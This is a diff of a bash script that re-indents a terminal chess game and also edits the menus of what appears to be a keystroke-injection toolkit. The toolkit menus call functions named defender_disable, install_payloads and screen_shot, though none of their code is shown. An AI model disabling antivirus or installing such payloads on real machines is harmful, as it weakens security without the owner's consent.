+	echo -en "\a\e[?5h"
+	sleep 0.1
+	echo -en "\e[?5l"
+	lastBell=$SECONDS
+fi
 }
 # Draw one field (of the gameboard)
 # Params:
@@ -1932,187 +1959,187 @@ function drawField(){
 	local x=$2
 	echo -en "\e[0m"
 # move coursor to absolute position
-	if $3 ; then
-		local yScr=$(( y + originY ))
-		local xScr=$(( x * 2 + originX ))
-		if $ascii && (( x >= 0 )) ; then
-			local xScr=$(( x * 3 + originX ))
-		fi
-		echo -en "\e[${yScr};${xScr}H"
+if $3 ; then
+	local yScr=$(( y + originY ))
+	local xScr=$(( x * 2 + originX ))
+	if $ascii && (( x >= 0 )) ; then
+		local xScr=$(( x * 3 + originX ))
 	fi
+	echo -en "\e[${yScr};${xScr}H"
+fi
 # draw vertical labels
-	if (( x==labelX && y >= 0 && y < 8)) ; then
-		if $hoverInit && (( hoverY == y )) ; then
-			if $color ; then
-				echo -en "\e[3${colorHover}m"
-			else
-				echo -en "\e[4m"
-			fi
-		elif (( selectedY == y )) ; then
-			if ! $color ; then
-				echo -en "\e[2m"
-			elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
-				echo -en "\e[3${colorPlayerA}m"
-			else
-				echo -en "\e[3${colorPlayerB}m"
-			fi
-		fi
+if (( x==labelX && y >= 0 && y < 8)) ; then
+	if $hoverInit && (( hoverY == y )) ; then
+	if $color ; then
+		echo -en "\e[3${colorHover}m"
+	else
+		echo -en "\e[4m"
+	fi
+	elif (( selectedY == y )) ; then
+	if ! $color ; then
+		echo -en "\e[2m"
+	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
+		echo -en "\e[3${colorPlayerA}m"
+	else
+		echo -en "\e[3${colorPlayerB}m"
+	fi
+fi
 # line number (alpha numeric)
-		if $unicodelabels ; then
-			echo -en "$(unicode e2 92 bd -$y) "
-		else
-			echo -en " \x$((48 - $y))"
-		fi
+if $unicodelabels ; then
+	echo -en "$(unicode e2 92 bd -$y) "
+else
+	echo -en " \x$((48 - $y))"
+fi
 # clear format
 # draw horizontal labels
-	elif (( x>=0 && y==labelY )) ; then
-		if $hoverInit && (( hoverX == x )) ; then
-			if $color ; then
-				echo -en "\e[3${colorHover}m"
-			else
-				echo -en "\e[4m"
-			fi
-		elif (( selectedX == x )) ; then
-			if ! $color ; then
-				echo -en "\e[2m"
-			elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
-				echo -en "\e[3${colorPlayerA}m"
-			else
-				echo -en "\e[3${colorPlayerB}m"
-			fi
-		else
-			echo -en "\e[0m"
-		fi
-		if $unicodelabels ; then
-			echo -en "$(unicode e2 9e 80 $x )\e[0m "
-		else
-			if $ascii ; then
-				echo -n " "
-			fi
-			echo -en "\x$((31 + $x))\e[0m "
-		fi
-# draw field
-	elif (( y >=0 && y < 8 && x >= 0 && x < 8 )) ; then
-		local f=${field["$y,$x"]}
-		local black=false
-		if (( ( x + y ) % 2 == 0 )) ; then
-			local black=true
-		fi
-# black/white fields
-		if $black ; then
-			if $color ; then
-				echo -en "\e[47;107m"
-			else
-				echo -en "\e[7m"
-			fi
-		else
-			$color && echo -en "\e[40m"
-		fi
-# background
-		if $hoverInit && (( hoverX == x && hoverY == y )) ; then
-			if ! $color ; then
-				echo -en "\e[4m"
-			elif $black ; then
-				echo -en "\e[4${colorHover};10${colorHover}m"
-			else
-				echo -en "\e[4${colorHover}m"
-			fi
-		elif (( selectedX != -1 && selectedY != -1 )) ; then
-			local selectedPlayer=$(( ${field[$selectedY,$selectedX]} > 0 ? 1 : -1 ))
-			if (( selectedX == x && selectedY == y )) ; then
-				if ! $color ; then
-					echo -en "\e[2m"
-				elif $black ; then
-					echo -en "\e[47m"
-				else
-					echo -en "\e[40;100m"
-				fi
-			elif $color && $colorHelper && canMove "$selectedY" "$selectedX" "$y" "$x" "$selectedPlayer" ; then
-				if $black ; then
-					if (( selectedPlayer < 0 )) ; then
-						echo -en "\e[4${colorPlayerA};10${colorPlayerA}m"
-					else
-						echo -en "\e[4${colorPlayerB};10${colorPlayerB}m"
-					fi
-				else
-					if (( selectedPlayer < 0 )) ; then
-						echo -en "\e[4${colorPlayerA}m"
-					else
-						echo -en "\e[4${colorPlayerB}m"
-					fi
-				fi
-			fi
-		fi
-# empty field?
-		if ! $ascii && (( f == 0 )) ; then
-			echo -en "  "
-		else
-# figure colors
-			if $color ; then
-				if (( selectedX == x && selectedY == y )) ; then
-					if (( f < 0 )) ; then
-						echo -en "\e[3${colorPlayerA}m"
-					else
-						echo -en "\e[3${colorPlayerB}m"
-					fi
-				else
-					if (( f < 0 )) ; then
-						echo -en "\e[3${colorPlayerA};9${colorPlayerA}m"
-					else
-						echo -en "\e[3${colorPlayerB};9${colorPlayerB}m"
-					fi
-				fi
-			fi
-# unicode figures
-			if $ascii ; then
-				echo -en " \e[1m${asciiNames[ $f + 6 ]} "
-			elif (( f > 0 )) ; then
-				if $color && $colorFill ; then
-					echo -en "$( unicode e2 99 a0 -$f ) "
-				else
-					echo -en "$( unicode e2 99 9a -$f ) "
-				fi
-			else
-				echo -en "$( unicode e2 99 a0 $f ) "
-			fi
-		fi
-# three empty chars
-	elif $ascii && (( x >= 0 )) ; then
-		echo -n "   "
-# otherwise: two empty chars (on unicode boards)
+elif (( x>=0 && y==labelY )) ; then
+	if $hoverInit && (( hoverX == x )) ; then
+	if $color ; then
+		echo -en "\e[3${colorHover}m"
 	else
-		echo -n "  "
+		echo -en "\e[4m"
 	fi
+	elif (( selectedX == x )) ; then
+	if ! $color ; then
+		echo -en "\e[2m"
+	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
+		echo -en "\e[3${colorPlayerA}m"
+	else
+		echo -en "\e[3${colorPlayerB}m"
+	fi
+	else
+		echo -en "\e[0m"
+	fi
+	if $unicodelabels ; then
+		echo -en "$(unicode e2 9e 80 $x )\e[0m "
+	else
+	if $ascii ; then
+		echo -n " "
+	fi
+		echo -en "\x$((31 + $x))\e[0m "
+	fi
+# draw field
+elif (( y >=0 && y < 8 && x >= 0 && x < 8 )) ; then
+	local f=${field["$y,$x"]}
+	local black=false
+if (( ( x + y ) % 2 == 0 )) ; then
+	local black=true
+fi
+# black/white fields
+if $black ; then
+if $color ; then
+	echo -en "\e[47;107m"
+else
+	echo -en "\e[7m"
+fi
+else
+	$color && echo -en "\e[40m"
+fi
+# background
+if $hoverInit && (( hoverX == x && hoverY == y )) ; then
+if ! $color ; then
+	echo -en "\e[4m"
+elif $black ; then
+	echo -en "\e[4${colorHover};10${colorHover}m"
+else
+	echo -en "\e[4${colorHover}m"
+fi
+elif (( selectedX != -1 && selectedY != -1 )) ; then
+	local selectedPlayer=$(( ${field[$selectedY,$selectedX]} > 0 ? 1 : -1 ))
+if (( selectedX == x && selectedY == y )) ; then
+if ! $color ; then
+	echo -en "\e[2m"
+elif $black ; then
+	echo -en "\e[47m"
+else
+	echo -en "\e[40;100m"
+fi
+elif $color && $colorHelper && canMove "$selectedY" "$selectedX" "$y" "$x" "$selectedPlayer" ; then
+if $black ; then
+if (( selectedPlayer < 0 )) ; then
+	echo -en "\e[4${colorPlayerA};10${colorPlayerA}m"
+else
+	echo -en "\e[4${colorPlayerB};10${colorPlayerB}m"
+fi
+else
+if (( selectedPlayer < 0 )) ; then
+	echo -en "\e[4${colorPlayerA}m"
+else
+	echo -en "\e[4${colorPlayerB}m"
+fi
+fi
+fi
+fi
+# empty field?
+if ! $ascii && (( f == 0 )) ; then
+	echo -en "  "
+else
+# figure colors
+if $color ; then
+if (( selectedX == x && selectedY == y )) ; then
+if (( f < 0 )) ; then
+	echo -en "\e[3${colorPlayerA}m"
+else
+	echo -en "\e[3${colorPlayerB}m"
+fi
+else
+if (( f < 0 )) ; then
+	echo -en "\e[3${colorPlayerA};9${colorPlayerA}m"
+else
+	echo -en "\e[3${colorPlayerB};9${colorPlayerB}m"
+fi
+fi
+fi
+# unicode figures
+if $ascii ; then
+	echo -en " \e[1m${asciiNames[ $f + 6 ]} "
+elif (( f > 0 )) ; then
+if $color && $colorFill ; then
+	echo -en "$( unicode e2 99 a0 -$f ) "
+else
+	echo -en "$( unicode e2 99 9a -$f ) "
+fi
+else
+	echo -en "$( unicode e2 99 a0 $f ) "
+fi
+fi
+# three empty chars
+elif $ascii && (( x >= 0 )) ; then
+	echo -n "   "
+# otherwise: two empty chars (on unicode boards)
+else
+	echo -n "  "
+fi
 # clear format
 	echo -en "\e[0m\e[8m"
 }
 # Draw the battlefield
 # (no params / return value)
 function draw() {
-	local ty
-	local tx
-	$useStty && stty -echo
-	$cursor || echo -e "\e[2J"
-	echo -e "\e[H\e[?25l\e[0m\n\e[K$title\e[0m\n\e[K"
-	for (( ty=0; ty<10; ty++ )) ; do
-		for (( tx=-2; tx<8; tx++ )) ; do
-			if $cursor ; then
-				local t
-				t="$(drawField "$ty" "$tx" true)"
-				if [[ "${redraw[$ty,$tx]}" != "$t" ]]; then
-					echo -n "$t"
-					redraw[$ty,$tx]="$t"
-					log="[$ty,$tx]"
-				fi
-			else
-				drawField "$ty" "$tx" false
-			fi
-		done
-		$cursor || echo ""
-	done
-	$useStty && stty echo
+local ty
+local tx
+$useStty && stty -echo
+$cursor || echo -e "\e[2J"
+echo -e "\e[H\e[?25l\e[0m\n\e[K$title\e[0m\n\e[K"
+for (( ty=0; ty<10; ty++ )) ; do
+	for (( tx=-2; tx<8; tx++ )) ; do
+	if $cursor ; then
+		local t
+		t="$(drawField "$ty" "$tx" true)"
+		if [[ "${redraw[$ty,$tx]}" != "$t" ]]; then
+			echo -n "$t"
+			redraw[$ty,$tx]="$t"
+			log="[$ty,$tx]"
+		fi
+	else
+		drawField "$ty" "$tx" false
+	fi
+done
+$cursor || echo ""
+done
+$useStty && stty echo
 # clear format
-	echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
+echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
 }
 # Read the next move coordinates
 # from keyboard (direct access or cursor keypad)
@@ -2129,151 +2156,134 @@ function inputCoord(){
 	local oldHoverY=$hoverY
 	IFS=''
 	$useStty && stty echo
-	if $mouse ; then
-		echo -en "\e[?9h"
+if $mouse ; then
+	echo -en "\e[?9h"
+fi
+while (( inputY < 0 || inputY >= 8 || inputX < 0  || inputX >= 8 )) ; do
+read -sN1 a
+	case "$a" in
+	$'\e' )
+	if read -t0.1 -sN2 b ; then
+	case "$b" in
+		'[A' | 'OA' )
+		hoverInit=true
+	if (( --hoverY < 0 )) ; then
+		hoverY=0
+		bell
+	fi ;;
+	'[B' | 'OB' )
+		hoverInit=true
+	if (( ++hoverY > 7 )) ; then
+		hoverY=7
+		bell
+	fi ;;
+	'[C' | 'OC' )
+		hoverInit=true
+	if (( ++hoverX > 7 )) ; then
+		hoverX=7
+		bell
+	fi ;;
+	'[D' | 'OD' )
+		hoverInit=true
+	if (( --hoverX < 0 )) ; then
+		hoverX=0
+		bell
+	fi ;;
+	'[3' )
+		ret=1
+		bell
+	break ;;
+	'[5' )
+		hoverInit=true
+	if (( hoverY == 0 )) ; then
+		bell
+	else
+		hoverY=0
+	fi ;;
+	'[6' )
+		hoverInit=true
+	if (( hoverY == 7 )) ; then
+		bell
+	else
+		hoverY=7
+	fi ;;
+	'OH' )
+		hoverInit=true
+	if (( hoverX == 0 )) ; then
+		bell
+	else
+		hoverX=0
+	fi ;;
+	'OF' )
+		hoverInit=true
+	if (( hoverX == 7 )) ; then
+		bell
+	else
+		hoverX=7
+	fi ;;
+	'[M' )
+		read -sN1 t
+		read -sN1 tx
+		read -sN1 ty
+		ty=$(( $(ord "$ty") - 32 - originY ))
+	if $ascii ; then
+		tx=$(( ( $(ord "$tx") - 32 - originX) / 3 ))
+	else
+		tx=$(( ( $(ord "$tx") - 32 - originX) / 2 ))
 	fi
-	while (( inputY < 0 || inputY >= 8 || inputX < 0  || inputX >= 8 )) ; do
-		read -sN1 a
-		case "$a" in
-			$'\e' )
-				if read -t0.1 -sN2 b ; then
-					case "$b" in
-						'[A' | 'OA' )
-							hoverInit=true
-							if (( --hoverY < 0 )) ; then
-								hoverY=0
-								bell
-							fi
-							;;
-						'[B' | 'OB' )
-							hoverInit=true
-							if (( ++hoverY > 7 )) ; then
-								hoverY=7
-								bell
-							fi
-							;;
-						'[C' | 'OC' )
-							hoverInit=true
-							if (( ++hoverX > 7 )) ; then
-								hoverX=7
-								bell
-							fi
-							;;
-						'[D' | 'OD' )
-							hoverInit=true
-							if (( --hoverX < 0 )) ; then
-								hoverX=0
-								bell
-							fi
-							;;
-						'[3' )
-							ret=1
-							bell
-							break
-							;;
-						'[5' )
-							hoverInit=true
-							if (( hoverY == 0 )) ; then
-								bell
-							else
-								hoverY=0
-							fi
-							;;
-						'[6' )
-							hoverInit=true
-							if (( hoverY == 7 )) ; then
-								bell
-							else
-								hoverY=7
-							fi
-							;;
-						'OH' )
-							hoverInit=true
-							if (( hoverX == 0 )) ; then
-								bell
-							else
-								hoverX=0
-							fi
-							;;
-						'OF' )
-							hoverInit=true
-							if (( hoverX == 7 )) ; then
-								bell
-							else
-								hoverX=7
-							fi
-							;;
-						'[M' )
-							read -sN1 t
-							read -sN1 tx
-							read -sN1 ty
-							ty=$(( $(ord "$ty") - 32 - originY ))
-							if $ascii ; then
-								tx=$(( ( $(ord "$tx") - 32 - originX) / 3 ))
-							else
-								tx=$(( ( $(ord "$tx") - 32 - originX) / 2 ))
-							fi
-							if (( tx >= 0 && tx < 8 && ty >= 0 && ty < 8 )) ; then
-								inputY=$ty
-								inputX=$tx
-								hoverY=$ty
-								hoverX=$tx
-							else
-								ret=1
-								bell
-								break
-							fi
-							;;
-						* )
-							bell
-					esac
-				else
-					ret=1
-					bell
-					break
-				fi
-				;;
-			$'\t' | $'\n' | ' ' )
-				if $hoverInit ; then
-					inputY=$hoverY
-					inputX=$hoverX
-				fi
-				;;
-			'~' )
-				;;
-			$'\x7f' | $'\b' )
-				ret=1
-				bell
-				break
-				;;
-			[A-Ha-h] )
-				t=$(ord $a)
-				if (( t < 90 )) ; then
-					inputY=$(( 72 - $(ord $a) ))
-				else
-					inputY=$(( 104 - $(ord $a) ))
-				fi
-				hoverY=$inputY
-				;;
-			[1-8] )
-				inputX=$(( a - 1 ))
-				hoverX=$inputX
-				;;
-			*)
-				bell
-				;;
-		esac
-		if $hoverInit && (( oldHoverX != hoverX || oldHoverY != hoverY )) ; then
-			oldHoverX=$hoverX
-			oldHoverY=$hoverY
-			draw
-		fi
+	if (( tx >= 0 && tx < 8 && ty >= 0 && ty < 8 )) ; then
+		inputY=$ty
+		inputX=$tx
+		hoverY=$ty
+		hoverX=$tx
+	else
+		ret=1
+		bell
+	break
+	fi ;;
+	* )
+		bell
+	esac
+	else
+		ret=1
+		bell
+	break
+	fi ;;
+	$'\t' | $'\n' | ' ' )
+		if $hoverInit ; then
+		inputY=$hoverY
+		inputX=$hoverX
+	fi ;;
+	'~' ) ;;
+	$'\x7f' | $'\b' )
+		ret=1
+		bell
+	break ;;
+	[A-Ha-h] )
+		t=$(ord $a)
+	if (( t < 90 )) ; then
+		inputY=$(( 72 - $(ord $a) ))
+	else
+		inputY=$(( 104 - $(ord $a) ))
+	fi
+		hoverY=$inputY ;;
+	[1-8] )
+		inputX=$(( a - 1 ))
+		hoverX=$inputX ;;
+	*)
+		bell ;;
+	esac
+	if $hoverInit && (( oldHoverX != hoverX || oldHoverY != hoverY )) ; then
+		oldHoverX=$hoverX
+		oldHoverY=$hoverY
+		draw
+	fi
 	done
-	if $mouse ; then
-		echo -en "\e[?9l"
-	fi
+if $mouse ; then
+	echo -en "\e[?9l"
+fi
 	$useStty && stty -echo
-	return $ret
+return $ret
 }
 # Player input
 # (reads a valid user movement)
@@ -2281,46 +2291,46 @@ function inputCoord(){
 # 	$1	current (user) player
 # Returns status code 0
 function input() {
-	local player=$1
-	SECONDS=0
-	message="\e[1m$(namePlayer "$player")\e[0m: Move your figure"
-	while true ; do
-		selectedY=-1
-		selectedX=-1
-		title="It's $(namePlayer "$player")s turn"
-		draw >&3
-		if inputCoord ; then
-			selectedY=$inputY
-			selectedX=$inputX
-			if (( ${field["$selectedY,$selectedX"]} == 0 )) ; then
-				warn "You cannot choose an empty field!" >&3
-			elif (( ${field["$selectedY,$selectedX"]} * player  < 0 )) ; then
-				warn "You cannot choose your enemies figures!" >&3
-			else
-				send "$player" "$selectedY" "$selectedX"
-				local figName=$(nameFigure ${field[$selectedY,$selectedX]} )
-				message="\e[1m$(namePlayer "$player")\e[0m: Move your \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to"
-				draw >&3
-				if inputCoord ; then
-					selectedNewY=$inputY
-					selectedNewX=$inputX
-					if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
-						warn "You didn't move..." >&3
-					elif (( ${field[$selectedNewY,$selectedNewX]} * $player > 0 )) ; then
-						warn "You cannot kill your own figures!" >&3
-					elif move "$player" ; then
-						title="$(namePlayer "$player") moved the \e[3m$figName\e[0m from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX") \e[2m(took him $SECONDS seconds)\e[0m"
-					send "$player" "$selectedNewY" "$selectedNewX"
-						return 0
-					else
-						warn "This move is not allowed!" >&3
-					fi
+local player=$1
+SECONDS=0
+message="\e[1m$(namePlayer "$player")\e[0m: Move your figure"
+while true ; do
+	selectedY=-1
+	selectedX=-1
+	title="It's $(namePlayer "$player")s turn"
+	draw >&3
+if inputCoord ; then
+	selectedY=$inputY
+	selectedX=$inputX
+if (( ${field["$selectedY,$selectedX"]} == 0 )) ; then
+	warn "You cannot choose an empty field!" >&3
+elif (( ${field["$selectedY,$selectedX"]} * player  < 0 )) ; then
+	warn "You cannot choose your enemies figures!" >&3
+else
+	send "$player" "$selectedY" "$selectedX"
+	local figName=$(nameFigure ${field[$selectedY,$selectedX]} )
+	message="\e[1m$(namePlayer "$player")\e[0m: Move your \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to"
+	draw >&3
+if inputCoord ; then
+	selectedNewY=$inputY
+	selectedNewX=$inputX
+if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
+	warn "You didn't move..." >&3
+elif (( ${field[$selectedNewY,$selectedNewX]} * $player > 0 )) ; then
+	warn "You cannot kill your own figures!" >&3
+elif move "$player" ; then
+	title="$(namePlayer "$player") moved the \e[3m$figName\e[0m from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX") \e[2m(took him $SECONDS seconds)\e[0m"
+	send "$player" "$selectedNewY" "$selectedNewX"
+return 0
+else
+	warn "This move is not allowed!" >&3
+fi
 # Same position again --> revoke
-					send "$player" "$selectedY" "$selectedX"
-				fi
-			fi
-		fi
-	done
+	send "$player" "$selectedY" "$selectedX"
+fi
+fi
+fi
+done
 }
 # AI interaction
 # (calculating movement)
@@ -2328,107 +2338,107 @@ function input() {
 # 	$1	current (ai) player
 # Verbose movement messages to stdout
 function ai() {
-	local player=$1
-	local val
-	SECONDS=0
-	title="It's $(namePlayer "$player")s turn"
-	message="Computer player \e[1m$(namePlayer "$player")\e[0m is thinking..."
+local player=$1
+local val
+SECONDS=0
+title="It's $(namePlayer "$player")s turn"
+message="Computer player \e[1m$(namePlayer "$player")\e[0m is thinking..."
+draw >&3
+negamax "$strength" 0 255 "$player" true
+val=$?
+local figName
+figName=$(nameFigure ${field[$selectedY,$selectedX]} )
+message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX")..."
+draw >&3
+send "$player" "$selectedY" "$selectedX"
+sleep "$sleep"
+if move $player ; then
+	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX")"
 	draw >&3
-	negamax "$strength" 0 255 "$player" true
-	val=$?
-	local figName
-	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
-	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX")..."
-	draw >&3
-	send "$player" "$selectedY" "$selectedX"
+	send "$player" "$selectedNewY" "$selectedNewX"
 	sleep "$sleep"
-	if move $player ; then
-		message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX")"
-		draw >&3
-		send "$player" "$selectedNewY" "$selectedNewX"
-		sleep "$sleep"
-		title="$( namePlayer "$player" ) moved the $figName from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX" ) (took him $SECONDS seconds)."
-	else
-		error "AI produced invalid move - that should not hapen!"
-	fi
+	title="$( namePlayer "$player" ) moved the $figName from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX" ) (took him $SECONDS seconds)."
+else
+	error "AI produced invalid move - that should not hapen!"
+fi
 }
 # Read row from remote
 # Returns row (0-7) as status code
 function receiveY() {
 local i
 while true; do
-	read -n 1 i
-	case $i in
-		[hH] ) return 0 ;;
-		[gG] ) return 1 ;;
-		[fF] ) return 2 ;;
-		[eE] ) return 3 ;;
-		[dD] ) return 4 ;;
-		[cC] ) return 5 ;;
-		[bB] ) return 6 ;;
-		[aA] ) return 7 ;;
-		* )
-			if $warnings ; then
-				warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
-			fi
-	esac
-	done
+read -n 1 i
+case $i in
+	[hH] ) return 0 ;;
+	[gG] ) return 1 ;;
+	[fF] ) return 2 ;;
+	[eE] ) return 3 ;;
+	[dD] ) return 4 ;;
+	[cC] ) return 5 ;;
+	[bB] ) return 6 ;;
+	[aA] ) return 7 ;;
+	* )
+	if $warnings ; then
+		warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
+	fi
+esac
+done
 }
 # Read column from remote
 # Returns column (0-7) as status code
 function receiveX() {
 	local i
 while true; do
-	read -n 1 i
-	case $i in
-		[1-8] ) return $(( i - 1 )) ;;
-		* )
-			if $warnings ; then
-				warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
-			fi
-	esac
-	done
+read -n 1 i
+case $i in
+	[1-8] ) return $(( i - 1 )) ;;
+	* )
+	if $warnings ; then
+		warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
+	fi
+esac
+done
 }
 # receive movement from connected player
 # (no params/return value)
 function receive() {
-	local player=$remote
-	SECONDS=0
-	title="It's $(namePlayer "$player")s turn"
-	message="Network player \e[1m$(namePlayer "$player")\e[0m is thinking... (or sleeping?)"
+local player=$remote
+SECONDS=0
+title="It's $(namePlayer "$player")s turn"
+message="Network player \e[1m$(namePlayer "$player")\e[0m is thinking... (or sleeping?)"
+draw >&3
+while true ; do
+	receiveY
+	selectedY=$?
+	receiveX
+	selectedX=$?
+	local figName
+	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
+	message"\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX)..."
 	draw >&3
-	while true ; do
-		receiveY
-		selectedY=$?
-		receiveX
-		selectedX=$?
-		local figName
-		figName=$(nameFigure ${field[$selectedY,$selectedX]} )
-		message"\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX)..."
+	receiveY
+	selectedNewY=$?
+	receiveX
+	selectedNewX=$?
+	if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
+		selectedY=-1
+		selectedX=-1
+		selectedNewY=-1
+		selectedNewX=-1
+		message="\e[1m$( namePlayer "$player" )\e[0m revoked his move... okay, that'll be time consuming"
 		draw >&3
-		receiveY
-		selectedNewY=$?
-		receiveX
-		selectedNewX=$?
-		if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
-			selectedY=-1
-			selectedX=-1
-			selectedNewY=-1
-			selectedNewX=-1
-			message="\e[1m$( namePlayer "$player" )\e[0m revoked his move... okay, that'll be time consuming"
-			draw >&3
-		else
-			break
-		fi
-	done
-	if move $player ; then
-		message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX)"
-		draw >&3
-		sleep "$sleep"
-		title="$( namePlayer $player ) moved the $figName from $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX) (took him $SECONDS seconds)."
 	else
-		error "Received invalid move from network - that should not hapen!"
+		break
 	fi
+done
+if move $player ; then
+	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX)"
+	draw >&3
+	sleep "$sleep"
+	title="$( namePlayer $player ) moved the $figName from $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX) (took him $SECONDS seconds)."
+else
+	error "Received invalid move from network - that should not hapen!"
+fi
 }
 # Write coordinates to network
 # Params:
@@ -2437,15 +2447,15 @@ function receive() {
 #	$3	column
 # (no return value/exit code)
 function send() {
-	local player=$1
-	local y=$2
-	local x=$3
-	if (( remote == player * (-1) )) ; then
-		sleep "$remotedelay"
-		coord "$y" "$x"
-		echo
-		sleep "$remotedelay"
-	fi
+local player=$1
+local y=$2
+local x=$3
+if (( remote == player * (-1) )) ; then
+	sleep "$remotedelay"
+	coord "$y" "$x"
+	echo
+	sleep "$remotedelay"
+fi
 }
 # Import transposition tables
 # by reading serialised cache from stdin
@@ -2461,23 +2471,23 @@ function importCache() {
 # Outputs serialised cache (to stdout)
 # (no params / return value)
 function exportCache() {
-	for hash in "${!cacheLookup[@]}" ; do
-		echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
-	done
+for hash in "${!cacheLookup[@]}" ; do
+	echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
+done
 }
 # Trap function for exporting cache
 # (no params / return value)
 function exitCache() {
 # permanent cache: export
-	if [[ -n "$cache" ]] ; then
-		echo -en "\r\n\e[2mExporting cache..." >&3
-		if $cachecompress ; then
-			exportCache | gzip > "$cache"
-		else
-			exportCache > "$cache"
-		fi
-		echo -e " done!\e[0m" >&3
+if [[ -n "$cache" ]] ; then
+	echo -en "\r\n\e[2mExporting cache..." >&3
+	if $cachecompress ; then
+		exportCache | gzip > "$cache"
+	else
+		exportCache > "$cache"
 	fi
+	echo -e " done!\e[0m" >&3
+fi
 }
 # Perform necessary tasks for exit
 # like deleting files and measuring runtime
@@ -3368,6 +3378,7 @@ MenuEnd
 	4) matrix_effect ; pass_time ;;
 	5) main_menu ;;
 	0) exit 0 ;;
+	[bB]) menu_B ;;
 	*) invalid_entry ; pass_time ;;
 	esac
 }
@@ -3446,6 +3457,7 @@ MenuEnd
 	2) defender_disable ; croc_pot_plus ;;
 	3) main_menu ;;
 	0) exit 0 ;;
+	[bB]) menu_B ;;
 	*) invalid_entry ; windows_defender ;;
 	esac
 else
@@ -3812,6 +3824,7 @@ MenuEnd
 	5) screen_shot ; install_payloads ;;
 	6) main_menu ;;
 	0) exit 0 ;;
+	[bB]) menu_B ;;
 	*) invalid_entry ; install_payloads ;;
 	esac
 }
@@ -3840,6 +3853,7 @@ MenuEnd
 	7) install_payloads ; menu_B ;;
 	8) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; menu_B ;;
 	esac
  }
@@ -3852,18 +3866,7 @@ function croc_status() {
 ##
 #----SSH Install screenfetch 
 ##
-local status="$(dpkg-query -W --showformat='${db:Status-Status}' "screenfetch" 2>&1)"
-if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-read_all INSTALL SCREENFETCH Y/N AND PRESS [ENTER]
-case $r_a in
-	[yY] | [yY][eE][sS])
-		apt -y install screenfetch ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-	*)
-		invalid_entry ; croc_status ;;
-esac
-fi
+	install_package screenfetch SCREENFETCH croc_status
 ##
 #----SSH Display screenfetch 
 ##
@@ -3968,21 +3971,7 @@ keystorkes_V() {
 nmon_system() {
 	echo -ne "$(Info_Screen '-nmon is short for Nigels performance Monitor for Linux
 -More details at http://nmon.sourceforge.net/pmwiki.php')\n\n"
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "nmon" 2>&1)"
-if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-	read_all INSTALL NMON MONITORING Y/N AND PRESS [ENTER]
-	case $r_a in
-	[yY] | [yY][eE][sS])
-		apt -y install nmon
-		echo -ne "\n$(ColorGreen 'NMON MONITORING IS NOW INSTALLED')\n" ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-	*)
-		invalid_entry ; nmon_system ;;
-	esac
-else
-		echo -ne "\n$(ColorGreen 'NMON MONITORING IS INSTALLED')\n"
-fi
+	install_package nmon NMON_MONITORING nmon_system croc_status
 nmon
 }
 ##
@@ -4047,6 +4036,7 @@ MenuEnd
 	10) list_match ; menu_A ;;
 	11) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; menu_A ;;
 	esac
  }
@@ -4112,21 +4102,7 @@ midnight_manager() {
 #----midnight install function
 ##
 mc_install() {
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "mc" 2>&1)"
-if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-	read_all INSTALL MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]
-	case $r_a in
-	[yY] | [yY][eE][sS])
-		apt -y install mc
-		echo -ne "\n$(ColorGreen 'MIDNIGHT COMMANDER IS NOW INSTALLED')\n" ;;
